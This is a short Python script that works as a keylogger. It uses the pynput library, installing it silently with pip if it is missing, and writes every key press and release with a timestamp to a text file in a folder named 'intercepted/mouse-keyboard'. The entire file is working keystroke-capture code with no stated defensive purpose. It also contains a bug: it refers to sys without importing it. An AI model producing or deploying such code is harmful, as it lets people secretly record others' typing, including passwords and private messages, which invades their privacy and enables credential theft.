import time,os
try:
    from pynput import keyboard
except ModuleNotFoundError:
    os.system('"%s\\python.exe" -m pip install pynput --user'%os.path.dirname(sys.executable))
    from pynput import keyboard

location='d:/截获/鼠标键盘/'
try:
    os.makedirs(location)
except:
    pass

def on_press(key):
    tim=time.localtime()
    name='%02d_%02d_%02d_%02d_%02d'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
    try:
        with open('%s键盘.txt'%location,'a') as f_obj:
            f_obj.write(f'{name}\t字母按下:{key.char}\n')
    except AttributeError:
        with open('%s键盘.txt'%location,'a') as f_obj:
            f_obj.write(f"{name}\t特殊键按下:{str(key).split('.')[1]}\n")

def on_release(key):
    tim=time.localtime()
    name='%02d_%02d_%02d_%02d_%02d'%(tim.tm_mon,tim.tm_mday,tim.tm_hour,tim.tm_min,tim.tm_sec)
    try:
        with open('%s键盘.txt'%location,'a') as f_obj:
            f_obj.write(f'{name}\t字母释放:{key.char}\n')
    except AttributeError:
        with open('%s键盘.txt'%location,'a') as f_obj:
            f_obj.write(f"{name}\t特殊键释放:{str(key).split('.')[1]}\n")

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
    print(23333)

